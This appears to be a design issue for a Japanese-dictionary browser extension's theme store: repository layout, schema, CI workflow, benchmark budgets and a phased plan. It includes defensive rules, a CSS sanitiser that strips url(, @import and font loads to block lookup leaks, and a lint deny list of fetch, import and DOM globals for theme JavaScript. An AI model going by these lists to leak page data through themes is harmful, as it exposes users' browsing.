Store UI for JS themes: a **JS** badge; the detail pane shows "Runs JavaScript inside the popup" with `js.summary`, the hooks, the release it ships in, the benchmark line (`onRender` p95, hover Δ) and a per-theme **Run this theme's JavaScript** switch (default on); JS themes not yet bundled show *Arrives with the next release*, never Install.

**CSS sanitiser** (CI, and Hachidori at install and adoption): parse in a detached `CSSStyleSheet`; drop rules whose `cssText` contains a backslash, `url(`/`src(`/`image-set(`/`paint(`/`attr(` or a custom function (the `isSafeDictionaryStyle` test, `glossary.js:1326-1342`); drop `@import`, `@font-face`, `@property`, `@keyframes`, `@namespace` and unknown at-rules, keep `@media`/`@supports`/`@container`; `font-family` from `DICTIONARY_FONT_FAMILIES` plus a CJK system-font allowlist; ≤ 256 KiB, ≤ 2 000 rules; adopt only through a constructed sheet, never a `<style>` element (the leak evidence).

**Privacy.** New endpoints, all under `https://raw.githubusercontent.com/bee-san/hachidori-themes/<commit from the index>/` (final-URL checked like `recommendedAssetUrlMatches`, `managed-dictionary-source.js:181-220`): `dist/index.json` on Refresh, `dist/themes/<slug>.css` on a CSS-only Install/Update, `themes/<slug>/screenshot.png` when a detail pane opens; no automatic requests by default; an optional **Check for new themes** (default Off) reuses the dictionary-schedule alarms (`background.js:1978`). `docs/privacy.md` gains a paragraph.

### The `hachidori-themes` repository

```text
hachidori-themes/
├── README.md, LICENSE (GPL-3.0-or-later; per-theme `license:` may differ)
├── schema/theme.schema.json          # JSON Schema 2020-12 for theme.yaml (incl. benchmark)
├── themes/{default,…}/theme.yaml     # the 42 current palettes, palette-only (miku etc. + theme.css)
│   ├── nazeka/{theme.yaml,theme.css,theme.js,screenshot.png,README.md}
│   └── rikaikun/{theme.yaml,theme.css,screenshot.png,README.md}
├── fixture/                          # design-preview sample data + reader.css from the pinned Hachidori tag
├── scripts/{validate,build-index,render,sanitize-css,bench}.mjs, theme-js.eslint.config.mjs
├── dist/index.json                   # committed; CI fails on `git diff --exit-code dist` after a rebuild
├── dist/themes/<slug>.css            # compiled palette block + sanitised theme.css
├── .github/PULL_REQUEST_TEMPLATE.md  # benchmark table + budget checklist, mandatory
└── .github/workflows/themes.yml
```

`theme.yaml` is the Nazeka manifest under *Evidence*; the schema ([theme.schema.json](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/hachidori-themes-skeleton/schema/theme.schema.json)) pins `slug` `^[a-z0-9][a-z0-9-]{1,40}$` = folder, semver `version`, a fixed `tags` vocabulary (incl. `js`), `mode`, the 17 `palette` keys as hex/oklch/rgb/hsl, `css: theme.css`, `js: { file, hooks, summary }`, `options` limited to the "partly" rows above with `NUMBER_RANGES` bounds (`reader-options.js:162-181`), and — whenever `css` or `js` is present — `screenshot` **and `benchmark`**: `harness: hover-popup.mjs`, `harnessCommit` (40-hex, must equal the pinned Hachidori tag), `chrome`, `sessions ≥ 3`, `measuredAt`, `onRenderP95Ms ≤ 2`, `onRenderMaxMs ≤ 8`, `{ default, theme }` medians for `hoverComplete`, `longEntryComplete`, `deepEntryComplete`, `kanjiOpen`, `coldFirst`, `heapDeltaMiB ≤ 2`, `results` URL (the Nazeka manifest above is the reference; validated with Ajv: a manifest without the block or with p95 2.5 fails).

`dist/index.json`, the only file Hachidori parses (generated; hashes over the compiled bytes; paths relative, resolved only against `https://raw.githubusercontent.com/bee-san/hachidori-themes/<source.commit>/`):

```json
{ "schema": 1, "source": { "repository": "bee-san/hachidori-themes", "commit": "0123abcd…" },
  "themes": [ { "slug": "nazeka", "name": "Nazeka", "version": "1.1.0", "author": "bee-san", "link": "https://github.com/wareya/nazeka",
      "description": "…", "tags": ["dark", "compact", "classic", "nazeka", "js"], "license": "GPL-3.0-or-later", "minHachidoriVersion": "0.1.7", "mode": "dark", "bundled": true,
      "css": { "path": "dist/themes/nazeka.css", "bytes": 11398, "sha256": "…" },
      "js": { "path": "themes/nazeka/theme.js", "bytes": 8851, "sha256": "…", "hooks": ["onRender"], "summary": "Rebuilds each entry …" },
      "screenshot": { "path": "themes/nazeka/screenshot.png", "width": 1120, "height": 840, "sha256": "…" },
      "benchmark": { "onRenderP95Ms": 0.3, "hoverCompleteMedianMs": { "default": 33.2, "theme": 33.3 }, "measuredAt": "2026-09-24" },
      "options": { "popupOpacityPercent": 100, "popupColumns": 1 }, "preview": { "swatches": ["#111111", "#cccccc", "#99ddff", "#99ff99"] } } ] }
```

`.github/workflows/themes.yml`:

```yaml
name: Themes
on: { pull_request: {}, push: { branches: [main] } }
permissions: { contents: read }
jobs:
  validate:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with: { persist-credentials: false }
      - uses: actions/setup-node@v4
        with: { node-version-file: .node-version, cache: npm }
      - run: npm ci
      - name: theme.yaml schema, CSS sanitiser, theme.js lint + contract, screenshot size, benchmark block present
        run: node scripts/validate.mjs --all
      - name: theme.js hook smoke against the fixture popup (jsdom, real api)
        run: node --test test/hooks.test.mjs
      - name: Rebuild dist; fail if the committed index or compiled CSS is stale
        run: node scripts/build-index.mjs && git diff --exit-code -- dist
      - name: Benchmark each changed theme vs default (hover-popup.mjs at fixture/HACHIDORI_TAG, 5 profiles each) and enforce the budgets
        run: node scripts/bench.mjs ci --changed --sessions 5 --chrome .cache/browsers --out bench
      - uses: actions/upload-artifact@v4
        with: { name: theme-benchmarks, path: bench/, retention-days: 30 }
      - name: Render every theme (CSS + JS) in the pinned Chrome for Testing and compare with the committed screenshots
        run: |
          sudo apt-get install -y fonts-noto-cjk
          npx @puppeteer/browsers install chrome@152.0.7977.75 --path .cache/browsers
          node scripts/render.mjs --chrome .cache/browsers --out render --compare --tolerance 0.02
      - uses: actions/upload-artifact@v4
        with: { name: theme-renders, path: render/, retention-days: 14 }
```

`scripts/validate.mjs` ([skeleton](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/hachidori-themes-skeleton/scripts/validate.mjs)) parses YAML with the `core` schema, validates with Ajv, checks slug = folder and uniqueness, sanitises `theme.css` (zero dropped rules), lints `theme.js` (≤ 64 KiB; default export `schema: 1`, `slug`, declared hooks only) and requires a 1120 × 840 `screenshot.png` when `css` or `js` is present. `scripts/render.mjs` applies each compiled theme to the fixture popup exactly as Hachidori will and screenshots it at 560 × 420 @2×.

**Benchmarking is a rule.** Every theme submitted with `css:` or `js:` is benchmarked, by the author (the guide below, numbers pasted into `theme.yaml` and the [PR template](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/hachidori-themes-skeleton/.github/PULL_REQUEST_TEMPLATE.md)) and again by CI, which runs the same harness against `main`'s default on the PR and fails when: the `benchmark:` block is missing or its `harnessCommit`/`chrome` differ from the pinned tag; **`onRender` p95 > 2 ms or max > 8 ms** (Nazeka: 0.3 / 0.6); any input's median hover → complete, kanji open or **cold first hover** regresses by **more than 5 ms and more than 10 %** (the harness's own rule; the cold case is what caught the load-at-first-popup cost); reading-tab **heap Δ > 2 MiB**; or the pasted numbers differ from CI's by more than 2 × the p95 spread. `scripts/bench.mjs` is the driver: `fixtures`, `run <slug>` (default + theme), `summarise` (medians / p95 table, `summary.json`, a ready-to-paste `benchmark:` block) and `check` (budgets + freshness) — today's versions are [`theme-bench-fixture.mjs`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/theme-bench-fixture.mjs), [`run-benchmark.sh`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/run-benchmark.sh) and [`summarise.mjs`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/summarise.mjs).

### How to benchmark a theme

Tested end to end from a clean shell (`env -i`, fresh clone of `main`, only Node on `PATH`; 1 min 53 s including the clone, `npm ci`, the Chrome download and both runs): [`guide-test.txt`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/guide-test.txt). Prerequisites, once per checkout (under a minute with a fast connection):

1. A Hachidori checkout at the tag `hachidori-themes` pins in `fixture/HACHIDORI_TAG` (today `main`) and **Node 22.23.1** (`.node-version`; `node --version` must print `v22.23.1`).
2. `npm ci --prefix test/tooling` — the lockfile's puppeteer-core 25.11.0 and `@puppeteer/browsers`, nothing global.
3. `npm --prefix test/tooling run install:chrome` — **Chrome for Testing 152.0.7977.75** (`config.chrome` in `test/tooling/package.json`) into `test/tmp/browsers/`.
4. Until Phase 2 lands the host and the harness option: `curl -fsSLO` the two patches from the evidence branch (`nazeka-js/host-prototype.patch`, `nazeka-js/benchmark/harness-benchmark.patch`), `git apply *.patch`, copy `themes/<slug>/{theme.yaml,theme.css,theme.js}` to `extension/vendor/themes/<slug>/` and fetch `theme-bench-fixture.mjs` + `summarise.mjs` into `bench-scripts/`. After Phase 2, `node scripts/vendor-themes.mjs --local ../hachidori-themes/themes/<slug>` does the copy.

Pointing the harness at a theme: `HACHIDORI_HOVER_OPTIONS` is JSON merged into the options the harness writes; `{"popupTheme":"<slug>"}` selects the theme exactly as Settings → Design would, and the host loads `extension/vendor/themes/<slug>/theme.css` + `theme.js`. From the checkout root (`/tmp/bench` any empty folder; `B` where the two driver scripts sit — `scripts/bench.mjs` in `hachidori-themes`):

```sh
export HACHIDORI_CHROME=$PWD/test/tmp/browsers/chrome/linux-152.0.7977.75/chrome-linux64/chrome
export HACHIDORI_PUPPETEER=$PWD/test/tooling/node_modules/puppeteer-core/lib/puppeteer/puppeteer-core.js
export HACHIDORI_HOVER_SAMPLES=5     # fresh Chrome profiles per side; CI uses 5, never fewer than 3
B=bench-scripts                      # the two driver scripts from step 4
node benchmark/hover-popup-fixture.mjs /tmp/bench/hover-popup-fixture.zip
HACHIDORI_ROOT=$PWD node $B/theme-bench-fixture.mjs /tmp/bench          # 24-sense 漢字 + kanji bank
A="/tmp/bench/hover-popup-fixture.zip /tmp/bench/theme-bench-senses.zip /tmp/bench/theme-bench-kanji.zip"
node benchmark/hover-popup.mjs /tmp/bench/default $A                       # baseline, ≈ 35 s
HACHIDORI_HOVER_OPTIONS='{"popupTheme":"<slug>"}' node benchmark/hover-popup.mjs /tmp/bench/<slug> $A   # ≈ 35 s
node $B/summarise.mjs /tmp/bench/default /tmp/bench/<slug> /tmp/bench/summary
```

Duration: ≈ 35 s per side at 5 profiles (56 timed scans each), ≈ 2 min in all; the harness prints one JSON line per scan and asserts the result signature is identical across profiles, so a theme that changes *what* is shown fails there first. **Reading the output:** `summary.md` is the table above — `first`/`complete` are frame-quantised (16.7 ms steps at 60 Hz), so compare medians and treat a one-frame p95 difference as noise; `onRender` p95/max is the theme's own cost, the number CI enforces; `layout · recalc · script` show where a slow theme spends its time; `theme.disabled: true` in any `raw.json` row means the hook threw — fix before submitting. **Acceptable:** `onRender` p95 ≤ 2 ms and max ≤ 8 ms; no input with median complete (or kanji open, or cold first hover) both > 5 ms and > 10 % slower; heap Δ ≤ 2 MiB — `summary.md` ends with the verdict. **Pasting:** `summarise.mjs` also writes `summary.yaml` — the `benchmark:` block for `theme.yaml` (set `results:` to where `raw.json` lives: a gist, a branch, the PR artifact) — and `summary.md`, which goes into the PR template's *Benchmark* section with the exact commands run.

### Hachidori side

**Engine.** Two owners beside `createCustomPopupStyle`: a theme sheet at index 1 of `adoptedStyleSheets` (reader.css, theme, custom) and a theme-JS host that `import()`s `vendor/themes/<slug>/theme.js` via `chrome.runtime.getURL` **at content-script start**, builds the frozen `view`/`api` and calls hooks after `bindResultActions` (`content.js:2221`) and `executeKanjiRequest` (:3221) — `host-prototype.patch` is this host (`createThemeStyle`, `syncTheme`, `runThemeHook`), to become `createThemeStyle` in `popup.js` plus a new `extension/theme-host.js`. `createPopupAppearance.applyTheme` keeps writing `host.dataset.hoshidictsTheme` (`popup.js:85`), so `auto` and the `::highlight` colour (:69-79) work unchanged. Settings and startup get the palette from `<link href="vendor/themes/<slug>.css">`; theme JS runs there only inside the Design preview iframe.

**Where themes live.** Bundled (42 palettes + `nazeka` + `rikaikun`): `extension/vendor/themes/<slug>/{theme.css,theme.js}` + `index.json`, committed build output from a new `scripts/vendor-themes.mjs` at a pinned commit (like `scripts/vendor-fluent-icons.py`), web-accessible like `render/reader.css` (`manifest.json:127-137`). Installed CSS-only themes: a new service-worker-owned, revisioned `chrome.storage.local` key **`themes`** `{ revision, installed: { [slug]: { version, sha256, bytes, css, installedAt, source } }, catalogue | null, jsEnabled: { [slug]: boolean } }`, read with the options at startup and on `storage.onChanged` (`unlimitedStorage`, `manifest.json:20`); written through `hd_themes_read`/`hd_themes_write` with `baseRevision` CAS beside `hd_options_write` (`background.js:1404-1412`).

**Options.** `ENUMERATED_OPTIONS.popupTheme` (`reader-options.js:643`) becomes a slug-shape check (`^auto$|^[a-z0-9][a-z0-9-]{1,40}$`) so a slug survives `normaliseOptions`, `validateOptionsPatch` and `validBackupReaderOptions` (`backup-state.js:72-77`); `renderThemeChoices` (`settings.js:1788`) builds the `<select>` from the index plus installed themes. Resolution: `auto` → `matchMedia`; bundled slug → vendored CSS (+ JS unless `jsEnabled` is false); installed slug → stored CSS; anything else → `default`, value untouched.

**Migration of the 42 palettes.** Stateless: same slugs, selectors and values, moved from `reader.css:37-958` into `themes/<slug>/theme.yaml` and compiled back into `vendor/themes/<slug>/theme.css`; the four extras (`reader.css:1147-1230`) become `theme.css`; `popupTheme: "dracula"` renders pixel-identically.

**Theme Store UI** (inside the Design card between "Appearance" and "Definitions", `settings.html:631`):

```text
┌ Design ──────────────────────────────────────────────────────────────┐
│ Appearance  Theme [ Nazeka ▾ ]   ← same <select>, grouped Bundled / Installed / Automatic
│ Theme Store   hachidori-themes @ 0123abc · 46 themes  [🔍 search]  Tags: (all)(dark)(light)(compact)(js)  [Refresh]
│  ┌ ▇▇▇▇ JS ─┐ ┌ ▇▇▇▇ ────┐ ┌ ▇▇▇▇ ────┐ ┌ ▇▇▇▇ JS ─┐
│  │ Nazeka    │ │ Rikaikun  │ │ Catppuccin│ │ Lorem     │
│  │ [In use ✓]│ │ [Install] │ │ [ Use ]   │ │next release│
│  └───────────┘ └───────────┘ └───────────┘ └───────────┘
│  ── Detail: [screenshot 560×420]  Nazeka v1.1.0 · GPL-3.0 · ships in 0.1.7 · onRender 0.3 ms p95, hover Δ 0 ms
│     ⚠ Runs JavaScript inside the popup: rebuilds each entry as Nazeka's rows … Bundled with this release ·
│       no network, cannot read pages · switched off automatically if it fails.        [x] Run its JavaScript
│     Applies on activation: opacity 100 %, 1 column  [Undo]   [Use this theme] [Open on GitHub ↗] [Report a problem ↗]
│ Definitions … Custom CSS (unchanged; "applied on top of the theme")
└──────────────────────────────────────────────────────────────────────┘
```

Card states: **Bundled** (*Use*), **Install** (CSS-only: fetch → SHA-256 → sanitise → store), **In use**, **Update available** (CSS-only), **Arrives with the next release** (JS theme not yet bundled), **Requires Hachidori ≥ x.y.z**. Cards reuse the `recommended-dictionary-list` pattern (`settings.html:243-266`): a `<ul role="list">` of `<article>`s with one button each; external links go through `hd_open_external` (`background.js:1249`). **Update flow:** Refresh fetches `dist/index.json` (`If-None-Match`), validates (schema-shaped, ≤ 1 MiB, relative paths under `dist/`/`themes/`, hex hashes) and stores `themes.catalogue`; CSS never changes silently. **Offline:** grid from the vendored index, installed themes from storage; a hash mismatch or sanitiser rejection stores nothing; an active slug without CSS falls back to `default` and the `<select>` says "(not installed)". **Backup / sharing:** `themes.installed` and `jsEnabled` join the backup snapshot (`backup-state.js:14`); Sharing (`SHARED_STATE_KEYS`, `background.js:195`) carries only the slug.

### Alternatives considered

- **Keep everything in `reader.css`.** Every theme needs a release; a Nazeka layout needs JS, not colours.
- **CSS-only themes** (this issue's first version): cannot remove the top bar, inline the reading or flatten the cards. Superseded.
- **Runtime-installed JS themes** (fetch, userScripts registration, sandboxed interpreter): policy violations or unusable (table above); JS themes ride releases.
- **Stylus-style "Install from URL"** for CSS: a new privacy endpoint per URL, no CI review (open question 5). **Vendor a YAML parser:** ~40 KB for no gain over CI-generated JSON.
- **Benchmark only JS themes:** a CSS theme can also force layout (`:has()`, filters, large shadows) — the harness costs 35 s, so every theme with `css` or `js` runs it.

## Implementation plan

Each phase ships independently. S ≈ a day, M ≈ a few days, L ≈ one to two weeks, XL ≈ several weeks.

### Phase 0 — Policy decision on JavaScript (S; decision + docs)

- Record in `AGENTS.md`: **theme JS is extension code** — vendored from a pinned `hachidori-themes` commit, linted and benchmarked there, reviewed here with the release, loaded only from `vendor/themes/`, never fetched; the hook contract (`schema: 1`, synchronous, `view`/`api` only) and the shared sanitiser are the trust boundary. Add a "Remote content" note to `docs/chrome-web-store.md` quoting the RHC definition and path (A). Reword the Custom CSS hint (`settings.html:829`): applied on top of the theme.
- Tests: none. Acceptance: [ ] `AGENTS.md`/docs state the rules and link this issue.

### Phase 1 — `hachidori-themes`: repository, schema, CI, 44 themes (L)

- Layout above; `themes/<slug>/theme.yaml` for the 42 palettes generated once from `reader.css:37-958` (extra blocks → `theme.css`); `themes/nazeka/` = the prototype files; `themes/rikaikun/` = the CSS draft. `build-index.mjs` writes `dist/` deterministically; `scripts/bench.mjs` (`fixtures`, `run`, `summarise`, `check`) from the three evidence scripts; PR template.
- Tests (`node --test`): `validate.test.mjs` — missing `theme.yaml`, slug/folder mismatch, duplicate slug, `css:`/`js:` without screenshot or benchmark, wrong-size screenshot, unknown `extends`, undeclared hook or `schema: 2` each fail with the named message; `sanitize.test.mjs` — every leak-table payload dropped, both starter themes pass; `lint.test.mjs` — the prototype passes, the hostile module fails on `import`, `fetch`, `document`, `Function`, `innerHTML`, `setTimeout`, `chrome`, `import()`; `hooks.test.mjs` — `onRender` on the fixture DOM builds `.nazeka-original`/`.nazeka-word`, hides the chrome, attaches nothing outside the popup; `build.test.mjs` — byte-identical rebuild, `default.css` equals `reader.css:37-58` modulo whitespace; `bench.test.mjs` — `check` fails on a missing block, a foreign `harnessCommit`, p95 2.5 ms, a 6 ms / 12 % complete regression, heap +3 MiB, and passes the Nazeka numbers.
- Acceptance: [ ] CI red on a folder without YAML, on stale `dist/`, on a `theme.js` that imports or touches `fetch`, **on a theme without `benchmark:` or over budget**; [ ] renders and benchmark artifacts uploaded for every theme; [ ] `nazeka` render matches the prototype screenshot.
- Risks: CI fonts vs users' fonts (`fonts-noto-cjk`, 2 % tolerance); raw GitHub caching.

### Phase 2 — Hachidori: theme engine (CSS + JS host) and the Store on the vendored index (L)

- `scripts/vendor-themes.mjs` (new): copy `dist/index.json` and every `bundled: true` theme's files into `extension/vendor/themes/`, record the commit in `SOURCE`, fail if `scripts/sanitize-css.mjs` ≠ `extension/theme-css.js`.
- `reader.css`: delete :37-958 and :1147-1230, keeping the `default` palette inline as the fallback. `popup.js`: export `createThemeStyle`. `extension/theme-host.js` (new, from `host-prototype.patch`): `loadTheme` at start, `runHook`, the frozen `view`/`api` incl. `lookup`, disable-on-throw, 8 ms budget log, per-call timings. `benchmark/hover-popup.mjs` + README: `HACHIDORI_HOVER_OPTIONS`, hook timings per row, the kanji-view step (from `harness-benchmark.patch`). `extension/theme-css.js` (new): the shared sanitiser. `extension/content.js`: hook calls at `bindResultActions` (:2221) and after `executeKanjiRequest` (:3221), `syncTheme` on options adoption (:4180). `design-preview.js`: same host. `settings-dom.js`, `settings-theme.js`, `startup.html`: vendored palette CSS. `reader-options.js`: index-driven `POPUP_THEME_GROUPS`, slug-shape `popupTheme`. `background.js`: `THEMES_KEY`, `hd_themes_read`/`hd_themes_write` (CAS like :1404-1412). `backup-state.js`: `themes` in the snapshot. `extension/theme-store.js` (new): grid, badges, detail pane, JS notice and switch. Manifests: `vendor/themes/*` web-accessible. Docs: `docs/architecture.md`, `extension/README.md`, `docs/privacy.md`, `benchmark/README.md`. Ships bundled themes (incl. `nazeka` JS) + engine + UI with **no network**.
- Tests: `test/theme-host.test.mjs` (new, jsdom) — `api.move` refuses a page target, `api.setVariable` refuses non-`--theme-*`, a throwing hook disables the module with one warning, `schema: 2` is refused, `jsEnabled: false` skips hooks but keeps CSS, the theme loads before the first popup; `test/theme-css.test.mjs` (new) — leak-table payloads dropped, both starter themes pass; `test/popup-theme.test.mjs` — `createThemeStyle` sits at index 1; `test/reader-options.test.mjs` — slug survives, `"Nazeka!"` → `default`, every indexed slug has files; `test/autumn-theme.test.mjs` → vendored file; `test/backup-state.test.mjs` — `themes` round-trips, tampered hash rejected; `test/extension-smoke.mjs` — index-driven catalogue, theme sheet between reader.css and custom CSS, Design preview runs the nazeka hook; `test/chrome-e2e.mjs`: "Nazeka JS theme removes the top bar and inlines the reading" (the capture as a check: `chromeHidden`, `.nazeka-reading === "たべる"`, `#111111`, Anki + audio buttons present, no Note button), "a throwing theme.js leaves the popup usable", "Custom CSS still wins over the theme", "a stored slug with no stylesheet falls back to default". Validation per `AGENTS.md`: `make-fixture`, `extension-smoke`, `chrome-e2e`, plus `firefox-smoke` for the manifest change, and the benchmark above re-run on the merged host (same budgets).
- Acceptance: [ ] `reader.css` has no palette literals except `default`; [ ] `default`, `autumn`, `high-contrast`, `solarized-light` render pixel-identically before/after; [ ] `nazeka` in the Store shows the JS badge and notice and renders as the prototype screenshot; [ ] the fault-isolation verdict holds in the e2e; [ ] no network from Settings → Design in the e2e request log; [ ] the Firefox package loads the vendored themes and the nazeka hook; [ ] the benchmark on the merged host stays within the budgets.
- Risks: GSM copies `reader.css` (`docs/overlay-mode.md`) — the inline `default` fallback keeps an older host working; Settings' first paint needs the vendored CSS before the pending attribute is released (`test/chrome-settings-first-frame.mjs`).

### Phase 3 — Remote catalogue refresh and CSS-only Install/Update (M)

- Refresh fetches `dist/index.json`, validates, stores `themes.catalogue`; Install/Update fetch `…/<index.commit>/dist/themes/<slug>.css`, verify SHA-256, sanitise, store (CSS-only; JS themes show *Arrives with the next release*); the detail pane fetches the screenshot; optional **Check for new themes** schedule (default Off); `docs/privacy.md` paragraph.
- Tests: `test/theme-store.test.mjs` (jsdom) — index validation rejects absolute URLs, paths outside `dist/`/`themes/`, non-hex hashes, > 1 MiB; a JS theme never gets an Install button; hash mismatch stores nothing. e2e — intercept `raw.githubusercontent.com` on the service-worker target: Install → In use → restyled; tampered CSS → error; newer version → Update badge; **zero** GitHub requests before Refresh.
- Acceptance: [ ] no theme request without a click or the schedule; [ ] tampered CSS never reaches storage; [ ] `docs/privacy.md` lists the three endpoints.
- Risk: a compromised theme-repo `main` can publish hostile CSS only; the sanitiser and hash pin bound it to "ugly popup"; JS is unaffected because it is never fetched.

### Phase 4 — Declarative options (M)

- `THEME_OPTION_KEYS` allowlist; `applyThemeOptions` → one `hd_options_write` on "Use this theme" with an Undo until the next navigation; never re-applied silently.
- Tests: unknown key or out-of-range value rejects the whole object; Use writes one revision and Undo restores it; e2e — `nazeka` Use sets opacity 100.
- Acceptance: [ ] no key outside the allowlist changes; [ ] Undo restores exact prior values; [ ] Reset Design still resets only `DESIGN_OPTION_KEYS`.

### Phase 5 — Runtime-installed JS themes (blocked by policy; XL if it changes)

Not planned: under current policy a JS theme reaches users only bundled (A) or pasted by the user (B). Revisit if Chrome adds a sanctioned repository-backed user-script path; until then releases are the update path and `version` + `minHachidoriVersion` say which release carries what.

### Acceptance criteria (whole issue)

- [ ] 44 themes in `hachidori-themes` with CI green (schema, sanitiser, lint, hook smoke, render); `vendor/themes/` reproducible from the pinned commit; sanitiser copies byte-identical.
- [ ] Nazeka JS theme selectable from the Store, rendering as the prototype screenshot; its `theme.js` passes the lint gate; the fault-isolation e2e is green.
- [ ] Benchmark gate live: every theme with `css`/`js` carries a `benchmark:` block, the themes-repo CI re-measures each PR against default and fails on the budgets (`onRender` p95 > 2 ms, complete/kanji/cold regressions > 5 ms and > 10 %, heap Δ > 2 MiB); the guide reproduces from a clean checkout.
- [ ] Every theme-related network request needs a click or the opt-in schedule; JS is never fetched (e2e request log).
- [ ] Keyboard/`aria` verified for the grid (`role="list"`, one button per card, focus returns when the detail pane closes).
- [ ] Backups carry installed themes and `jsEnabled`; Sharing carries only the slug; `AGENTS.md` records the rules; required suites green (`make-fixture`, `extension-smoke`, `chrome-e2e`, `firefox-smoke`, new `theme-host`/`theme-css`/`theme-store` tests).

### Risks

- **Policy drift.** Bundling is the conservative reading of the RHC rules; if Google narrows even bundled extensibility, JS themes fall back to CSS (`jsEnabled` off).
- **Theme JS has content-script privileges.** Lint + hook contract + review is a policy, not a sandbox. Mitigations: the lint's empty-globals rule makes any free identifier an error, `api` is the only object handed in, vendoring is a reviewed PR, `jsEnabled` turns any theme's JS off.
- **API surface is public.** `view`/`api` and the `reader.css` class names become a contract; `schema` versioning, the fixture render and benchmark in theme-repo CI and `minHachidoriVersion` catch breakage first.
- **Release coupling.** A JS theme fix waits for a Hachidori release; the vendor bump is a one-line PR and the CSS half can still hot-fix via the store.
- **Performance.** One synchronous hook per render: measured 0.3 ms p95 for Nazeka with no hover regression; the one real cost found (loading at the first popup, +34 ms cold) is fixed by loading at start, and CI's benchmark gate keeps every theme inside the same budgets.
- **GSM overlay.** Hosts copy `reader.css`; the inline `default` fallback covers the move.

### Open questions for bee-san

1. Should the **user's own Custom CSS** also go through the sanitiser (it can leak lookups, but it is user-provided)? Proposal: leave it and say so beside the textarea.
2. Should Settings follow the popup theme's full palette (today) or only its `mode`?
3. Kanji view: keep `Press [Back] to cancel.` (the prototype) or rely on Alt+B alone?
4. Licence for the 42 migrated palettes (GSM PR #549 / daisyUI under GPL-3.0-or-later, `reader.css:1-12`): keep GPL for the repo and require an SPDX `license:` per theme?
5. "Install from URL" (Stylus-style) for CSS-only themes behind Advanced later, or is the curated repo the only source on purpose?

### Out of scope

Runtime download of theme JS; theme access to lookups, Anki, storage, network or the page outside the popup; theming Anki cards or the toolbar popup; per-site or per-dictionary theme switching and profiles (L1 stays excluded per `AGENTS.md`); localisation of theme metadata; migrating existing Custom CSS/JS into themes automatically.
